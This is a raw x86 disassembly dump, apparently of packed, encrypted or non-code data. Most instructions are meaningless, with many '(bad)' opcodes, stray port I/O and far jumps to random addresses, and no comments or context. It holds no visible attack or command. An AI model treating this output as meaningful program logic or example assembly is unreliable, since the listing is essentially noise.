  41aa8b:	push   esp
  41aa8c:	xchg   esp,eax
  41aa8d:	xchg   edx,eax
  41aa8e:	pop    edi
  41aa8f:	(bad)  
  41aa91:	xor    al,BYTE PTR [ebp-0x619213d3]
  41aa97:	jmp    0xa0641cd3
  41aa9c:	inc    ebx
  41aa9d:	les    ebx,FWORD PTR [edi]
  41aa9f:	cmp    eax,0x48123d1d
  41aaa4:	xlat   BYTE PTR ds:[ebx]
  41aaa5:	in     eax,0x57
  41aaa7:	xor    ah,BYTE PTR [ebp+0x79b5ff20]
  41aaad:	lods   eax,DWORD PTR ds:[esi]
  41aaae:	adc    DWORD PTR [edx-0x6d],esi
  41aab1:	repz das 
  41aab3:	mov    al,ds:0x8cb1aa85
  41aab8:	pop    esi
  41aab9:	and    ah,BYTE PTR [ecx]
  41aabb:	fsubr  QWORD PTR [esi]
  41aabd:	xchg   ebx,eax
  41aabe:	in     al,0xbe
  41aac0:	jecxz  0x41ab07
  41aac2:	bound  ecx,QWORD PTR [edi-0x3c0ba752]
  41aac8:	dec    ecx
  41aac9:	sahf   
  41aaca:	mov    esp,0x65462d5a
  41aacf:	ds inc esi
  41aad1:	mov    ah,0xd9
  41aad3:	sub    DWORD PTR [eax-0x4dd7597a],ebp
  41aad9:	push   esi
  41aadb:	jo     0x41aaee
  41aadd:	sbb    ecx,DWORD PTR [ecx+0x401a634b]
  41aae3:	mov    ds:0x2210b8b6,al
  41aae8:	jecxz  0x41ab2c
  41aaea:	fisubr DWORD PTR [ebp+0x4b678e5d]
  41aaf0:	dec    ebx
  41aaf1:	fneni(8087 only) 
  41aaf3:	xchg   BYTE PTR [edx+0x46],bh
  41aaf6:	ret    
  41aaf7:	es pop esp
  41aaf9:	mov    ebp,0x8ed05ee8
  41aafe:	or     ebp,DWORD PTR [esi]
  41ab00:	or     ebp,ecx
  41ab02:	test   al,0x41
  41ab04:	daa    
  41ab05:	sub    ebp,DWORD PTR [ebp-0x70431084]
  41ab0b:	mov    ebp,0x5819254c
  41ab10:	ins    DWORD PTR es:[edi],dx
  41ab11:	dec    ecx
  41ab12:	cmp    esi,DWORD PTR [ecx+eax*1+0x4e3c9df3]
  41ab19:	rol    BYTE PTR [ecx-0x30],0xc1
  41ab1d:	es jecxz 0x41aaa9
  41ab20:	jnp    0x41ab72
  41ab22:	dec    edx
  41ab23:	pop    esp
  41ab24:	arpl   WORD PTR [ebx+0x419ca7dd],sp
  41ab2a:	int    0xd
  41ab2c:	push   es
  41ab2d:	(bad)  [edx]
  41ab2f:	stc    
  41ab30:	push   es
  41ab31:	fdiv   QWORD PTR [eax+0x6c]
  41ab34:	bound  esp,QWORD PTR [edx+0x45566624]
  41ab3a:	and    BYTE PTR ds:0xcade2946,0xd0
  41ab41:	adc    esi,0xfffffff3
  41ab44:	and    esp,esi
  41ab46:	push   esi
  41ab47:	xor    eax,0x469e64c3
  41ab4c:	(bad)  
  41ab4d:	fldz   
  41ab4f:	in     eax,0xd1
  41ab51:	vmovupd XMMWORD PTR [esi-0x1],xmm0
  41ab56:	push   edx
  41ab57:	mov    edi,0x5dfd275d
  41ab5c:	jbe    0x41aae9
  41ab5e:	imul   esp,DWORD PTR [edx-0x1e],0x4610d5c9
  41ab65:	and    eax,0x291dbf34
  41ab6a:	aam    0x78
  41ab6c:	pop    eax
  41ab6d:	mov    ebx,0xa6d0da14
  41ab72:	out    dx,eax
  41ab73:	cmp    edx,DWORD PTR [edi-0x3009544d]
  41ab79:	addr16 push eax
  41ab7b:	xor    BYTE PTR [edx],bl
  41ab7d:	jnp    0x41ab2e
  41ab7f:	retf   
  41ab80:	stos   BYTE PTR es:[edi],al
  41ab81:	lods   eax,DWORD PTR ds:[esi]
  41ab82:	cmp    eax,0xc9a78a71
  41ab87:	jns    0x41abda
  41ab89:	in     eax,0xfa
  41ab8b:	je     0x41ab76
  41ab8d:	mov    esp,0xf93b95fb
  41ab92:	gs (bad) 
  41ab95:	arpl   WORD PTR [edx-0x1b],ax
  41ab98:	popa   
  41ab99:	out    0xf2,al
  41ab9b:	inc    edx
  41ab9c:	sub    al,0xcb
  41ab9e:	lods   eax,DWORD PTR ds:[esi]
  41ab9f:	push   edx
  41aba0:	ret    
  41aba1:	in     eax,dx
  41aba2:	adc    BYTE PTR [ecx-0x4633a650],ah
  41aba8:	addr16 push 0x61
  41abab:	neg    DWORD PTR [edx+0x1c9fa553]
  41abb1:	xchg   ecx,eax
  41abb2:	push   es
  41abb3:	pop    ebp
  41abb4:	fstp   DWORD PTR [edx-0x1ebea2dd]
  41abba:	in     al,0x90
  41abbc:	ja     0x41ac3a
  41abbe:	and    al,0xbe
  41abc0:	mov    edx,0x573895de
  41abc5:	pushf  
  41abc6:	mov    ecx,DWORD PTR [eax]
  41abc8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41abc9:	inc    ebx
  41abca:	inc    esi
  41abcb:	(bad)  
  41abcc:	mov    ch,0x3f
  41abce:	or     DWORD PTR gs:[ecx-0xaf36f6],edx
  41abd5:	ret    0x44e
  41abd8:	ret    0xf475
  41abdb:	lods   al,BYTE PTR ds:[esi]
  41abdc:	ret    
  41abdd:	retf   0xa003
  41abe0:	sub    ebp,DWORD PTR [edi+0x68019f47]
  41abe6:	addr16 pop ds
  41abe8:	mov    ebp,DWORD PTR ds:0xd76bec3c
  41abee:	(bad)  
  41abef:	sahf   
  41abf0:	pushf  
  41abf1:	add    BYTE PTR [ebp+ebx*4+0x31],0xe9
  41abf6:	lock jae 0x41ab8c
  41abf9:	pop    edi
  41abfa:	and    bh,BYTE PTR [edi+0x5402b452]
  41ac00:	je     0x41ac30
  41ac02:	pusha  
  41ac03:	dec    ebp
  41ac04:	mov    bl,0xe7
  41ac06:	std    
  41ac07:	sub    DWORD PTR [ecx-0x676066f3],edx
  41ac0d:	popf   
  41ac0e:	push   es
  41ac0f:	scas   al,BYTE PTR es:[edi]
  41ac10:	scas   al,BYTE PTR es:[edi]
  41ac11:	cs jae 0x41ac08
  41ac14:	out    dx,eax
  41ac15:	lods   eax,DWORD PTR ds:[esi]
  41ac16:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41ac17:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41ac18:	push   ds
  41ac19:	pop    es
  41ac1a:	test   BYTE PTR [eax-0x7bfe4eb5],cl
  41ac20:	rcl    cl,1
  41ac22:	dec    BYTE PTR [ecx-0x23]
  41ac25:	xchg   edx,eax
  41ac26:	leave  
  41ac27:	in     al,0x6a
  41ac29:	mov    al,0xf1
  41ac2b:	pop    ss
  41ac2c:	adc    al,0xb
  41ac2e:	xchg   ecx,eax
  41ac2f:	sub    eax,0x9f799a38
  41ac34:	out    dx,al
  41ac35:	(bad)  
  41ac36:	sbb    al,ch
  41ac38:	test   al,0xca
  41ac3a:	test   DWORD PTR [eax],esp
  41ac3c:	gs mov dh,0x4b
  41ac3f:	ret    
  41ac40:	out    0x0,eax
  41ac42:	inc    ecx
  41ac43:	add    BYTE PTR [edi+0x545c1dcc],bh
  41ac49:	mov    bh,0x49
  41ac4b:	jmp    0x7e97279f
  41ac50:	fldcw  WORD PTR [ecx+esi*2-0x1d]
  41ac54:	nop
  41ac55:	sbb    al,0xc8
  41ac57:	cmp    al,0xc7
  41ac59:	sub    BYTE PTR [edi],dl
  41ac5b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41ac5c:	int3   
  41ac5d:	jmp    FWORD PTR [esi]
  41ac5f:	shl    BYTE PTR [esi+0xd],1
  41ac62:	dec    eax
  41ac63:	dec    edi
  41ac64:	xchg   edx,eax
  41ac65:	lods   eax,DWORD PTR ds:[esi]
  41ac66:	cmp    esp,DWORD PTR [esp+ecx*1]
  41ac69:	les    ebp,FWORD PTR [ebx+eax*4]
  41ac6c:	outs   dx,BYTE PTR ds:[esi]
  41ac6d:	ficomp WORD PTR [ebx-0x13]
  41ac70:	jae    0x41ac7e
  41ac72:	xchg   edi,eax
  41ac73:	cs call 0x6683:0x1f04ef59
  41ac7b:	xchg   edx,eax
  41ac7c:	push   ebp
  41ac7d:	stos   DWORD PTR es:[edi],eax
  41ac7e:	xor    eax,DWORD PTR [ecx+eax*2+0x77b3f58]
  41ac85:	clc    
  41ac86:	gs xchg ebp,eax
  41ac88:	cmp    DWORD PTR [eax+0x34],eax
  41ac8b:	sub    eax,0x67707e38
  41ac90:	inc    esi
  41ac91:	jge    0x41ac91
  41ac93:	mov    ds:0xa257f63c,al
  41ac98:	jnp    0x41acf1
  41ac9a:	jg     0x41ac28
  41ac9c:	(bad)  
  41ac9d:	mov    eax,0xc44681c5
  41aca2:	arpl   WORD PTR [ecx+edi*4+0x50],bx
  41aca6:	xor    DWORD PTR [esi+0x27],eax
  41aca9:	xchg   edx,eax
  41acaa:	sbb    DWORD PTR [eax+edi*8-0x74],ebp
  41acae:	jbe    0x41ac83
  41acb0:	in     eax,0x7a
  41acb2:	jns    0x41ac49
  41acb4:	xor    eax,0xf7b9d4f3
  41acb9:	mov    ah,0xa2
  41acbb:	xchg   dh,ch
  41acbd:	sbb    bl,al
  41acbf:	popa   
  41acc0:	clc    
  41acc1:	push   ds
  41acc2:	hlt    
  41acc3:	inc    esi
  41acc4:	cli    
  41acc5:	cmp    dl,al
  41acc7:	ins    DWORD PTR es:[edi],dx
  41acc8:	mov    cl,0x88
  41acca:	(bad)  
  41accb:	jb     0x41ac7d
  41accd:	pop    esp
  41acce:	sub    ebx,DWORD PTR [edx-0x1415835f]
  41acd4:	pop    ebp
  41acd5:	clc    
  41acd6:	push   ecx
  41acd7:	(bad)  
  41acd9:	or     BYTE PTR [ebx+0x69],dh
  41acdc:	mov    eax,ds:0xbc9af003
  41ace1:	lds    edx,FWORD PTR [eax+eiz*2]
  41ace4:	rcl    DWORD PTR [edi+0x4b0f0148],cl
  41acea:	xchg   edi,eax
  41aceb:	sbb    esp,DWORD PTR [edx+eiz*4+0x7e]
  41acef:	pop    ds
  41acf0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41acf1:	(bad)  [ecx]
  41acf3:	mov    dh,0xe0
  41acf5:	out    0x74,eax
  41acf7:	into   
  41acf8:	mov    dh,0xc7
  41acfa:	cli    
  41acfb:	jno    0x41acf3
  41acfd:	and    eax,0x91e6fe4b
  41ad02:	out    0x3d,eax
  41ad04:	or     BYTE PTR [esi+edi*1],al
  41ad07:	push   ecx
  41ad08:	inc    ecx
  41ad09:	test   al,0x4f
  41ad0b:	js     0x41ad7d
  41ad0d:	push   eax
  41ad0e:	arpl   WORD PTR [ebx-0x32],sp
  41ad11:	sahf   
  41ad12:	retf   
  41ad13:	std    
  41ad14:	cdq    
  41ad15:	lds    ecx,FWORD PTR [esi+0x1d1fae6c]
  41ad1b:	inc    esi
  41ad1c:	rol    BYTE PTR [edx-0x1a],1
  41ad1f:	retf   
  41ad20:	xlat   BYTE PTR ds:[ebx]
  41ad21:	and    eax,esp
  41ad23:	mov    dl,0x2b
  41ad25:	xor    DWORD PTR ds:0x7cf9ff01,0xf32c9a87
  41ad2f:	xor    DWORD PTR [esi],eax
  41ad31:	fnsave [ecx+0x74]
  41ad34:	dec    edx
  41ad35:	imul   ebx,DWORD PTR [esi],0xca456df7
  41ad3b:	jecxz  0x41adb5
  41ad3d:	rol    BYTE PTR [eax+0x3a455b96],1
  41ad43:	mov    dl,bl
  41ad45:	hlt    
  41ad46:	lds    eax,FWORD PTR [ebx+0x78]
  41ad49:	cwde   
  41ad4a:	test   eax,0x9d80da07
  41ad4f:	sbb    eax,0xb7475443
  41ad54:	ror    BYTE PTR [ecx+0x78],0x83
  41ad58:	js     0x41ad94
  41ad5a:	cmp    eax,0x24dea0b7
  41ad5f:	sbb    eax,0x332756f9
  41ad64:	(bad)  
  41ad65:	jo     0x41acf8
  41ad67:	ja     0x41ad6b
  41ad69:	jo     0x41ad82
  41ad6b:	les    esi,FWORD PTR [esi]
  41ad6d:	mov    ss,WORD PTR [eax+0x5e4d59db]
  41ad73:	lds    esp,FWORD PTR [esi-0x6a]
  41ad76:	adc    al,0x29
  41ad78:	out    dx,al
  41ad79:	test   DWORD PTR [eax+esi*1],edx
  41ad7c:	test   DWORD PTR [edi],ebx
  41ad7e:	out    0x56,al
  41ad80:	jp     0x41adac
  41ad82:	hlt    
  41ad83:	add    bh,BYTE PTR [ebx+edi*2+0x5ca9583f]
  41ad8a:	scas   al,BYTE PTR es:[edi]
  41ad8b:	scas   eax,DWORD PTR es:[edi]
  41ad8c:	in     eax,dx
  41ad8d:	in     al,dx
  41ad8e:	fiadd  DWORD PTR [eax+0x56]
  41ad91:	push   ebx
  41ad92:	stos   DWORD PTR es:[edi],eax
  41ad93:	push   0x33bb15d7
  41ad98:	push   edi
  41ad99:	mov    esp,0x873185a2
  41ad9e:	in     eax,0x77
  41ada0:	mov    eax,ds:0x3e99b065
  41ada5:	and    BYTE PTR [edx+0x59],ah
  41ada8:	lahf   
  41ada9:	ret    
  41adaa:	sbb    eax,0x654a4b0b
  41adaf:	adc    bl,bl
  41adb1:	loop   0x41ad9b
  41adb3:	fistp  DWORD PTR ds:0xb20ece5e
  41adb9:	jmp    0x41ad6b
  41adbb:	push   edx
  41adbc:	shl    DWORD PTR [ebx],0x1
  41adbf:	std    
  41adc0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41adc1:	push   edi
  41adc2:	int    0xef
  41adc4:	cmp    eax,0xb7341cb9
  41adc9:	jl     0x41ae35
  41adcb:	sub    eax,esp
  41adcd:	sub    edi,DWORD PTR [eax+0x1e]
  41add0:	pop    ebp
  41add1:	cwde   
  41add2:	mov    ss,edi
  41add4:	xlat   BYTE PTR ds:[ebx]
  41add5:	dec    edi
  41add6:	push   esi
  41add7:	lods   al,BYTE PTR ds:[esi]
  41add8:	ror    ebx,0x91
  41addb:	scas   eax,DWORD PTR es:[edi]
  41addc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41addd:	ss xchg esp,eax
  41addf:	dec    ecx
  41ade0:	fdiv   DWORD PTR [esi]
  41ade2:	and    DWORD PTR [ecx-0xd],edi
  41ade5:	loop   0x41ada2
  41ade7:	sti    
  41ade8:	cdq    
  41ade9:	es popa 
  41adeb:	jne    0x41adff
  41aded:	das    
  41adee:	dec    ebp
  41adef:	cdq    
  41adf0:	das    
  41adf1:	mov    ebp,0x4954c1b9
  41adf6:	push   esi
  41adf7:	fldenv [eax]
  41adf9:	or     esi,DWORD PTR [edi+0x3e685412]
  41adff:	jb     0x41ae47
  41ae01:	scas   al,BYTE PTR es:[edi]
  41ae02:	add    DWORD PTR [eax],edi
  41ae04:	mov    al,0x3b
  41ae06:	mov    dl,0x10
  41ae08:	imul   edi,DWORD PTR [ecx],0x4e800606
  41ae0e:	icebp  
  41ae0f:	outs   dx,BYTE PTR ds:[esi]
  41ae10:	stos   BYTE PTR es:[edi],al
  41ae11:	and    bl,ah
  41ae13:	int3   
  41ae14:	mov    edx,es
  41ae16:	addr16 inc edx
  41ae18:	enter  0x8f65,0xaf
  41ae1c:	mov    al,ds:0x2d07eb7a
  41ae21:	mov    esp,0x1fad6030
  41ae26:	fdiv   st(7),st
  41ae28:	icebp  
  41ae29:	adc    ebp,DWORD PTR [edi-0x48]
  41ae2c:	mov    ch,0x76
  41ae2e:	ror    BYTE PTR [esi*4+0x1d2a5a25],cl
  41ae35:	sub    eax,0x783cefcd
  41ae3a:	xchg   ecx,eax
  41ae3b:	outs   dx,BYTE PTR ds:[esi]
  41ae3c:	adc    cl,BYTE PTR [ecx]
  41ae3e:	clc    
  41ae3f:	lods   eax,DWORD PTR ds:[esi]
  41ae40:	lods   al,BYTE PTR ds:[esi]
  41ae41:	retf   
  41ae42:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ae43:	add    eax,0x78d2514
  41ae48:	sub    ecx,DWORD PTR [ebx-0x495a366b]
  41ae4e:	sub    BYTE PTR [ebx-0x5e42b34a],al
  41ae54:	jecxz  0x41ae3b
  41ae56:	ss and eax,0x8d25c46c
  41ae5c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ae5d:	mov    ch,0xb9
  41ae5f:	in     eax,0xae
  41ae61:	pop    edi
  41ae62:	stos   DWORD PTR es:[edi],eax
  41ae63:	ss (bad) 
  41ae65:	push   eax
  41ae66:	mov    bh,0x78
  41ae68:	int    0xc7
  41ae6a:	mov    eax,DWORD PTR [esi]
  41ae6c:	inc    ecx
  41ae6d:	icebp  
  41ae6e:	xchg   DWORD PTR [ecx],esp
  41ae70:	jl     0x41ae50
  41ae72:	enter  0x8ced,0xea
  41ae76:	loopne 0x41ae44
  41ae78:	fs push ecx
  41ae7a:	inc    DWORD PTR [ecx]
  41ae7c:	push   ds
  41ae7d:	fldcw  WORD PTR [ecx+0x58f988aa]
  41ae83:	dec    eax
  41ae84:	(bad)  [ebp+0x7f]
  41ae87:	adc    DWORD PTR [edx+0x17],eax
  41ae8a:	shl    DWORD PTR [ebp-0x7b80db13],0xcb
  41ae91:	xor    ebx,eax
  41ae93:	std    
  41ae94:	ror    BYTE PTR [eax+0x4e],0x51
  41ae98:	pop    es
  41ae99:	cwde   
  41ae9a:	sub    eax,0x18e69a3e
  41ae9f:	popf   
  41aea0:	and    dh,BYTE PTR [ebp+edi*4-0x4b99a6fd]
  41aea7:	mov    bh,0xe5
  41aea9:	retf   0xd460
  41aeac:	mov    DWORD PTR [ebx+0x77848338],edx
  41aeb2:	lea    esp,[edx-0x1bddc8c5]
  41aeb8:	xor    bh,al
  41aeba:	xchg   BYTE PTR [edi],al
  41aebc:	push   esp
  41aebd:	clc    
  41aebe:	js     0x41ae40
  41aec0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41aec1:	ins    DWORD PTR es:[edi],dx
  41aec2:	add    ebp,edi
  41aec4:	fstp   TBYTE PTR [eax]
  41aec6:	fadd   st,st(1)
  41aec8:	add    al,0xe8
  41aeca:	retf   0xe016
  41aecd:	pop    edx
  41aece:	pop    ecx
  41aecf:	pop    ebp
  41aed0:	sub    ebx,DWORD PTR [eax-0x14]
  41aed3:	cmp    edx,0x8d163bf5
  41aed9:	ret    
  41aeda:	mov    ebp,DWORD PTR [ebx-0x68]
  41aedd:	cmp    al,al
  41aedf:	cs scas al,BYTE PTR es:[edi]
  41aee1:	ret    0x1e01
  41aee4:	out    dx,eax
  41aee5:	xchg   ebp,eax
  41aee6:	in     eax,0x8b
  41aee8:	out    dx,al
  41aee9:	jne    0x41af23
  41aeeb:	sbb    eax,0xab89e458
  41aef0:	jae    0x41ae7d
  41aef2:	int3   
  41aef3:	test   al,0x4
  41aef5:	dec    eax
  41aef6:	push   0xe
  41aef8:	mov    ?,edi
  41aefa:	pop    ebx
  41aefb:	clc    
  41aefc:	mov    bx,0xc027
  41af00:	push   ebp
  41af01:	mov    ch,0x7e
  41af03:	loop   0x41af00
  41af05:	jecxz  0x41af16
  41af07:	je     0x41af60
  41af09:	pop    ss
  41af0a:	jne    0x41af43
  41af0c:	addr16 pop esi
  41af0e:	jmp    0x41af25
  41af10:	and    eax,0xbe14be68
  41af15:	pop    edx
  41af16:	mov    ch,0xf9
  41af18:	rol    DWORD PTR [esi+esi*8-0x12],cl
  41af1c:	cmp    ebx,DWORD PTR [edi-0x3d4d62ea]
  41af22:	mov    ch,cl
  41af24:	xchg   ebp,eax
  41af25:	inc    esi
  41af26:	jmp    0x41af79
  41af28:	xchg   ebp,eax
  41af29:	and    eax,0x4883a3a5
  41af2e:	mov    bh,0x6b
  41af30:	inc    ebx
  41af31:	jmp    0xa27c:0x4b60b34f
  41af38:	push   eax
  41af39:	pop    edx
  41af3a:	aaa    
  41af3b:	push   ebx
  41af3c:	nop
  41af3d:	pop    DWORD PTR [ecx-0x6]
  41af40:	push   0xffffffa3
  41af42:	mov    dl,0x4c
  41af44:	les    ebx,FWORD PTR [ebp-0x6aca513e]
  41af4a:	fs xchg edx,eax
  41af4c:	outs   dx,DWORD PTR ds:[esi]
  41af4d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41af4e:	xor    edi,ebx
  41af50:	loope  0x41af25
  41af52:	popf   
  41af53:	add    eax,0x1c790987
  41af58:	adc    BYTE PTR [edi],al
  41af5a:	dec    ebp
  41af5b:	jl     0x41af6c
  41af5d:	push   es
  41af5e:	fiadd  DWORD PTR [esi+0x4c]
  41af61:	or     ebp,DWORD PTR [ecx-0x551ac8a5]
  41af67:	add    eax,0xb1c403c8
  41af6c:	jmp    0x52182053
  41af71:	xchg   edi,eax
  41af72:	mov    eax,ds:0x176db701
  41af77:	or     bh,0x4e
  41af7a:	sub    dh,BYTE PTR [eax+0x7b4a554d]
  41af80:	mov    ah,0x2a
  41af82:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41af83:	jl     0x41afbc
  41af85:	jo     0x41affb
  41af87:	bound  ebx,QWORD PTR [ecx+eiz*1-0x1c]
  41af8b:	imul   esp,esp,0xbefc61df
  41af91:	dec    edx
  41af92:	popa   
  41af93:	sub    BYTE PTR [edi-0x61],0xbc
  41af97:	pop    esi
  41af98:	jnp    0x41af3c
  41af9a:	push   ds
  41af9b:	push   0xffffff8e
  41af9d:	xchg   edx,eax
  41af9e:	inc    eax
  41af9f:	fsubr  DWORD PTR [esi+ecx*1-0x11]
  41afa3:	jbe    0x41b011
  41afa5:	lds    edx,FWORD PTR [esi-0x44b28d4c]
  41afab:	retf   0x6d1a
  41afae:	fidiv  WORD PTR [esi+ecx*8-0x9]
  41afb2:	mov    ah,0xb
  41afb4:	mov    BYTE PTR [ebp+ebx*1+0x4b1af54f],ch
  41afbb:	sub    DWORD PTR [esi+eiz*4],esp
  41afbe:	sub    al,0x76
  41afc0:	fmul   QWORD PTR [esi-0xe]
  41afc3:	sbb    ah,BYTE PTR [esi-0x43]
  41afc6:	out    dx,al
  41afc7:	adc    al,0x16
  41afc9:	adc    cl,BYTE PTR [ebx-0x49bb568]
  41afcf:	mov    ebx,0xb5a5080a
  41afd4:	aad    0xd4
  41afd6:	or     al,0x5c
  41afd8:	adc    dh,BYTE PTR [eax-0x7c13c3da]
  41afde:	mov    bh,0xa9
  41afe0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41afe1:	mov    ds:0x86fdfb19,eax
  41afe6:	xor    eax,0x4e963aba
  41afeb:	mov    dl,0x79
  41afed:	xchg   BYTE PTR [ebx-0x17],bl
  41aff0:	int3   
  41aff1:	push   eax
  41aff2:	out    dx,eax
  41aff3:	mov    WORD PTR [ebx+ebp*8+0x50],gs
  41aff7:	in     al,0x5b
  41aff9:	or     dh,BYTE PTR [esi-0x4b]
  41affc:	shl    DWORD PTR [ebx+ebp*4+0x3d],1
  41b000:	xor    DWORD PTR [esi],0x4e21e227
  41b006:	mov    edx,0xdfcb7200
  41b00b:	adc    bh,bl
  41b00d:	inc    ebx
  41b00e:	(bad)  
  41b00f:	pop    ecx
  41b010:	sbb    eax,0x7a2fad2a
  41b015:	setnp  BYTE PTR [ebp+0x4a]
  41b019:	and    eax,0x484224fb
  41b01e:	rcr    DWORD PTR [esp+esi*2-0x4158c21a],1
  41b025:	out    0x88,eax
  41b027:	jns    0x41aff5
  41b029:	xchg   esp,eax
  41b02a:	neg    DWORD PTR [edx+0x5]
  41b02d:	(bad)  
  41b02e:	out    dx,eax
  41b02f:	mov    esi,0x7e1e57a
  41b034:	cmp    eax,0x699732d6
  41b039:	pop    es
  41b03a:	xor    al,0x41
  41b03c:	test   al,0x29
  41b03e:	mov    edx,0xadea5279
  41b043:	dec    esi
  41b044:	out    dx,al
  41b045:	(bad)  
  41b046:	jbe    0x41b0b2
  41b048:	ja     0x41b030
  41b04a:	stc    
  41b04b:	push   cs
  41b04c:	fisttp DWORD PTR [edi-0x4f3b4242]
  41b052:	mov    BYTE PTR [esp+edx*1+0x63efe52b],al
  41b059:	cmp    cl,bl
  41b05b:	cwde   
  41b05c:	xor    DWORD PTR [ecx],ebp
  41b05e:	sbb    eax,0x3fbdbdf6
  41b063:	mov    ah,0x90
  41b065:	mul    bl
  41b067:	push   ebx
  41b068:	or     DWORD PTR [edx-0x3e],ebp
  41b06b:	mov    ?,WORD PTR [ecx-0x10]
  41b06e:	(bad)  
  41b06f:	call   DWORD PTR [esi]
  41b071:	ror    BYTE PTR [ecx],1
  41b073:	shr    DWORD PTR [edx],cl
  41b075:	sbb    al,0x42
  41b077:	adc    dh,bl
  41b079:	mov    al,0xfa
  41b07b:	mov    fs,edx
  41b07d:	mov    al,ds:0xfbac9e31
  41b082:	mov    cs,WORD PTR [ecx+0x3729152d]
  41b088:	out    dx,al
  41b089:	bound  esi,QWORD PTR [ebx+0x1d]
  41b08c:	int3   
  41b08d:	ds stos DWORD PTR es:[edi],eax
  41b08f:	aas    
  41b090:	xlat   BYTE PTR ds:[ebx]
  41b091:	rcr    DWORD PTR [edx-0x6f8aaf50],1
  41b097:	aam    0x15
  41b099:	inc    edx
  41b09a:	aad    0x14
  41b09c:	ins    DWORD PTR es:[edi],dx
  41b09d:	(bad)  
  41b09f:	mov    WORD PTR [ecx+0x14],?
  41b0a2:	add    DWORD PTR [esp+ebp*2],esi
  41b0a5:	add    BYTE PTR [esi-0x29c2b347],bl
  41b0ab:	jecxz  0x41b0f2
  41b0ad:	in     eax,dx
  41b0ae:	pop    esp
  41b0af:	shl    edx,1
  41b0b1:	dec    edx
  41b0b2:	mov    ds:0xd7482fb0,eax
  41b0b7:	in     eax,0x21
  41b0b9:	cmp    DWORD PTR [edx+0x24],edi
  41b0bc:	add    DWORD PTR [edx+0xa],eax
  41b0bf:	call   0x2c8af7b8
  41b0c4:	sbb    DWORD PTR [eax],edi
  41b0c6:	scas   eax,DWORD PTR es:[edi]
  41b0c7:	sub    esi,DWORD PTR [ecx]
  41b0c9:	push   edx
  41b0ca:	xchg   edx,eax
  41b0cb:	scas   eax,DWORD PTR es:[edi]
  41b0cc:	lea    eax,ds:0xc5f15712
  41b0d2:	rcr    DWORD PTR [edi-0x5049b9af],cl
  41b0d8:	pop    ebx
  41b0d9:	jo     0x41b101
  41b0db:	or     bl,BYTE PTR [esi-0x1a8c0a7a]
  41b0e1:	leave  
  41b0e2:	je     0x41b0ad
  41b0e4:	ins    BYTE PTR es:[edi],dx
  41b0e5:	inc    ebx
  41b0e6:	loope  0x41b100
  41b0e8:	jmp    0x41b084
  41b0ea:	clc    
  41b0eb:	shl    BYTE PTR [ecx],cl
  41b0ed:	out    dx,al
  41b0ee:	call   0x15d3a5f4
  41b0f3:	call   0x139c:0x84e2eadb
  41b0fa:	lds    esi,FWORD PTR [ebp+0x77]
  41b0fd:	mov    al,ds:0x3ac72881
  41b102:	nop
  41b103:	sbb    eax,0xf0b0ffb0
  41b108:	icebp  
  41b109:	das    
  41b10a:	sbb    eax,0x4528a11f
  41b10f:	je     0x41b0f6
  41b111:	(bad)  
  41b112:	call   0x12fb:0x7dda4b98
  41b119:	xchg   ebx,eax
  41b11a:	inc    edi
  41b11b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41b11c:	or     dl,bh
  41b11e:	aas    
  41b11f:	clc    
  41b120:	fcmovnu st,st(4)
  41b122:	cmp    BYTE PTR [ebx-0x5ec70096],bh
  41b128:	sbb    eax,0x364fa2d5
  41b12d:	int    0xad
  41b12f:	sbb    eax,0x3b2fdf51
  41b134:	push   ebx
  41b135:	xor    BYTE PTR [eax+0x41],ch
  41b138:	jae    0x41b11a
  41b13a:	stc    
  41b13b:	mov    dl,0x35
  41b13d:	pushf  
  41b13e:	loope  0x41b194
  41b140:	push   edx
  41b141:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b142:	loop   0x41b0e3
  41b144:	push   ebp
  41b145:	cmp    bh,BYTE PTR [esi-0x2b]
  41b148:	xchg   BYTE PTR [ebp-0x63],dh
  41b14b:	pushw  cs
  41b14d:	fdivrp st(3),st
  41b14f:	daa    
  41b150:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b151:	sub    BYTE PTR [eax],dl
  41b153:	push   ebx
  41b154:	fldcw  WORD PTR [edi+0x3a]
  41b157:	aaa    
  41b158:	sbb    eax,0xe8079fb
  41b15d:	mov    esi,0x56614713
  41b162:	mov    esi,0xe847da02
  41b167:	lahf   
  41b168:	pop    esi
  41b169:	fistp  DWORD PTR [ebp+0x2c5d5400]
  41b16f:	mov    eax,0xc9add094
  41b174:	pushf  
  41b175:	and    edi,esi
  41b177:	mov    esp,0x3b3e698f
  41b17c:	iret   
  41b17d:	lds    ecx,FWORD PTR [edi]
  41b17f:	jmp    0x5c2c:0x810ed30a
  41b186:	scas   al,BYTE PTR es:[edi]
  41b187:	fmul   QWORD PTR [ebx+0x77]
  41b18a:	not    esi
  41b18c:	push   edi
  41b18d:	in     al,dx
  41b18e:	push   edx
  41b18f:	and    al,0xb9
  41b191:	stos   DWORD PTR es:[edi],eax
  41b192:	jl     0x41b174
  41b194:	in     al,0x8e
  41b196:	and    DWORD PTR [ebp-0xcc77bf4],edx
  41b19c:	arpl   WORD PTR [esp+esi*8-0x5e],bx
  41b1a0:	add    edi,DWORD PTR [ecx+0x1]
  41b1a3:	ffreep st(0)
  41b1a5:	fimul  WORD PTR [esi-0x20]
  41b1a8:	jo     0x41b135
  41b1aa:	shl    DWORD PTR [ecx-0x13a8abb8],cl
  41b1b0:	lods   al,BYTE PTR ds:[esi]
  41b1b1:	jge    0x41b150
  41b1b3:	pop    es
  41b1b4:	add    ecx,DWORD PTR [ebp+0x8f5d04d]
  41b1ba:	(bad)  
  41b1bb:	test   BYTE PTR [eax-0x72],0x29
  41b1bf:	popa   
  41b1c0:	aad    0x2e
